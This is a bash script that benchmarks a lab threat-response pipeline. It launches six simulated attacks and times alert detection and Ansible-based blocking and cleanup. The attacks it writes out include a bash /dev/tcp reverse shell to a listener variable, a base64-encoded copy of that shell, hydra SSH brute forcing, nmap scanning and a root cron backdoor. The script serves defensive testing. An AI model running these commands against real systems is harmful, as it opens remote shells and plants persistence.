#!/bin/bash
# Split response time into stages for all six scenarios, using one consistent end
# point (integrator-log completion). Reports per trial:
#   total = launch->done, detect = launch->alert, respond = alert->done,
#   ansible = playbook run, integ = respond - ansible. Optional args: scenarios to run.
set -uo pipefail

source "$(dirname "${BASH_SOURCE[0]}")/../experiments.env"
TARGET_USER="$LAB_USER"
ALERTS="/var/ossec/logs/alerts/alerts.json"
RUNS=3
RESULTS_FILE="$(pwd)/breakdown_results.txt"
DEFAULT_SCENARIOS="web_shell cron_persistence reverse_shell base64_exec port_scan ssh_brute_force"
if [ "$#" -gt 0 ]; then SCENARIOS="$*"; APPEND=1; else SCENARIOS="$DEFAULT_SCENARIOS"; APPEND=0; fi
PAYLOAD=$(echo -n "bash -i >& /dev/tcp/$LISTENER_IP/$LISTENER_PORT 0>&1" | base64)

CTRL="$SSH_CONTROLLER"; ATK="$SSH_ATTACKER"; WEB="$SSH_WEBSERVER"; WS="$SSH_WORKSTATION"

rule_ids_for() { case "$1" in
  port_scan) echo "100501";; ssh_brute_force) echo "5712,5758";;
  web_shell) echo "100530";; reverse_shell) echo "100520";;
  base64_exec) echo "100300";; cron_persistence) echo "100510";; esac; }

cooldown_for() { case "$1" in
  port_scan|ssh_brute_force) echo 75;; web_shell) echo 30;;
  reverse_shell|base64_exec) echo 20;; cron_persistence) echo 15;; esac; }

wait_max_for() { case "$1" in ssh_brute_force) echo 90;; *) echo 60;; esac; }

reset_block_state() {
  $CTRL "cd /opt/automated-ti-pipeline && sudo ansible endpoints -i $INVENTORY -m shell \
    -a 'iptables -D INPUT -s $ATTACKER_IP -j DROP -m comment --comment ti-pipeline 2>/dev/null; \
        iptables -D OUTPUT -d $ATTACKER_IP -j DROP -m comment --comment ti-pipeline 2>/dev/null; \
        true' -b" >/dev/null 2>&1 || true
  $CTRL "sudo python3 -c \"import json,pathlib; p=pathlib.Path('/var/log/ti-pipeline/blocked.json'); \
    d=json.loads(p.read_text()) if p.exists() else {}; d.pop('$ATTACKER_IP',None); \
    p.write_text(json.dumps(d,indent=2))\"" >/dev/null 2>&1 || true
}

pre_clean() { local scen="$1" i="$2"; case "$scen" in
  port_scan) reset_block_state; $ATK "sudo pkill -f nmap" 2>/dev/null || true;;
  ssh_brute_force) reset_block_state; $ATK "pkill -f hydra" 2>/dev/null || true;;
  web_shell) $WEB "sudo rm -f /var/www/html/decomp_*.php /var/quarantine/*decomp_*" 2>/dev/null || true;;
  reverse_shell|base64_exec) $CTRL "pkill -f 'nc -lvp $LISTENER_PORT'" 2>/dev/null || true;
    $WS "sudo pkill -f 'bash -i'" 2>/dev/null || true;;
  cron_persistence) $WS "sudo rm -f /etc/cron.d/backdoor" 2>/dev/null || true;;
esac; sleep 2; }

launch_attack() { local scen="$1" i="$2"; case "$scen" in
  port_scan) $ATK "sudo nohup nmap -sS -p 1-1000 -T4 $WEBSERVER_IP >/dev/null 2>&1 &" 2>/dev/null;;
  ssh_brute_force) $ATK "nohup hydra -l $TARGET_USER -P /tmp/bf_wordlist.txt -t 4 ssh://$WEBSERVER_IP >/dev/null 2>&1 &" 2>/dev/null;;
  web_shell) $WEB "echo '<?php echo 1; ?>' | sudo tee /var/www/html/decomp_$i.php >/dev/null" 2>/dev/null;;
  reverse_shell) $CTRL "timeout 30 nc -lvp $LISTENER_PORT >/dev/null 2>&1 &" 2>/dev/null; sleep 1;
    $WS "sudo bash -c 'nohup bash -i >& /dev/tcp/$LISTENER_IP/$LISTENER_PORT 0>&1 &'" 2>/dev/null;;
  base64_exec) $CTRL "timeout 30 nc -lvp $LISTENER_PORT >/dev/null 2>&1 &" 2>/dev/null; sleep 1;
    $WS "sudo bash -c 'echo $PAYLOAD | base64 -d >/dev/null; nohup bash -i >& /dev/tcp/$LISTENER_IP/$LISTENER_PORT 0>&1 &'" 2>/dev/null;;
  cron_persistence) $WS "echo '* * * * * root /tmp/backdoor.sh' | sudo tee /etc/cron.d/backdoor >/dev/null" 2>/dev/null;;
esac; }

get_done() {  # prints "t_done_iso|duration_ms" for first rc=0 dispatch after $2
  $CTRL "sudo python3 -c \"
import json
start='$2'; scen='$1'
with open('/var/log/ti-pipeline/integrator.log') as f:
    for line in f:
        line=line.strip()
        if not line: continue
        d=json.loads(line)
        if d.get('t','')>start and scen in str(d.get('matched','')) and d.get('outcome',{}).get('rc')==0:
            print(d['t']+'|'+str(d.get('outcome',{}).get('duration_ms','')))
            break
\"" 2>/dev/null
}

get_alert_epoch() {  # prints epoch of first alert with rule.id in $1 after epoch $2
  $CTRL "sudo tail -c 2000000 $ALERTS | python3 -c \"
import sys,json
from datetime import datetime
ids=set('$1'.split(',')); start=float('$2')
for line in sys.stdin:
    line=line.strip()
    if not line: continue
    try: d=json.loads(line)
    except Exception: continue
    if str(d.get('rule',{}).get('id','')) not in ids: continue
    try: ep=datetime.strptime(d.get('timestamp',''),'%Y-%m-%dT%H:%M:%S.%f%z').timestamp()
    except Exception: continue
    if ep>start:
        print(ep); break
\"" 2>/dev/null
}

# one-time setup: brute-force wordlist on the attacker
$ATK "seq 1 25 | sed 's/^/wrongpass/' > /tmp/bf_wordlist.txt" 2>/dev/null || true
[ "$APPEND" -eq 1 ] || : > "$RESULTS_FILE"

for scen in $SCENARIOS; do
  ids="$(rule_ids_for "$scen")"; cd_s="$(cooldown_for "$scen")"; wmax="$(wait_max_for "$scen")"
  echo "===================== $scen ====================="
  for i in $(seq 1 "$RUNS"); do
    echo "----- $scen run $i / $RUNS -----"
    pre_clean "$scen" "$i"
    t_start=$(python3 -c "import time;print(time.time())")
    t_start_iso=$(python3 -c "from datetime import datetime;print(datetime.now().isoformat())")
    launch_attack "$scen" "$i"

    done_line=""; elapsed=0
    while [ "$elapsed" -lt "$wmax" ]; do
      done_line="$(get_done "$scen" "$t_start_iso")"
      [ -n "$done_line" ] && break
      sleep 2; elapsed=$((elapsed+2))
    done
    echo ""
    if [ -z "$done_line" ]; then echo "  TIMEOUT (no rc=0 in ${wmax}s)"; sleep "$cd_s"; continue; fi

    t_done_iso="${done_line%%|*}"; dur="${done_line##*|}"
    alert_epoch="$(get_alert_epoch "$ids" "$t_start")"

    line=$(python3 -c "
from datetime import datetime
t_start=$t_start; tdone=datetime.fromisoformat('$t_done_iso').timestamp()
dur='$dur'; alert='$alert_epoch'
total=tdone-t_start; ansible=(float(dur)/1000) if dur else float('nan')
if alert:
    a=float(alert); detect=a-t_start; respond=tdone-a; integ=respond-ansible
    print(f'{total:.3f} {detect:.3f} {respond:.3f} {ansible:.3f} {integ:.3f}')
else:
    print(f'{total:.3f} NA NA {ansible:.3f} NA')
")
    echo "  total/detect/respond/ansible/integ = $line"
    echo "$scen $line" >> "$RESULTS_FILE"
    sleep "$cd_s"
  done
done

# final tidy-up so the lab is left clean
reset_block_state
$CTRL "pkill -f 'nc -lvp $LISTENER_PORT'" 2>/dev/null || true
$WS "sudo pkill -f 'bash -i'; sudo rm -f /etc/cron.d/backdoor" 2>/dev/null || true
$WEB "sudo rm -f /var/www/html/decomp_*.php /var/quarantine/*decomp_*" 2>/dev/null || true

echo ""
echo "===================== SUMMARY (mean seconds) ====================="
python3 - "$RESULTS_FILE" <<'PY'
import sys, statistics, collections
cols=['total','detect','respond','ansible','integ']
g=collections.defaultdict(lambda: collections.defaultdict(list))
for line in open(sys.argv[1]):
    p=line.split()
    if len(p)!=6: continue
    scen=p[0]
    for c,v in zip(cols,p[1:]):
        if v!='NA':
            try: g[scen][c].append(float(v))
            except ValueError: pass
print(f"{'scenario':18s} {'n':>2s} {'total':>7s} {'detect':>7s} {'respond':>7s} {'ansible':>7s} {'integ':>7s}")
for scen in g:
    n=len(g[scen]['total'])
    row=f"{scen:18s} {n:2d}"
    for c in cols:
        vals=g[scen][c]
        row+=f" {statistics.mean(vals):7.2f}" if vals else f" {'NA':>7s}"
    print(row)
PY
echo ""
echo "Per-trial rows saved to: $RESULTS_FILE"
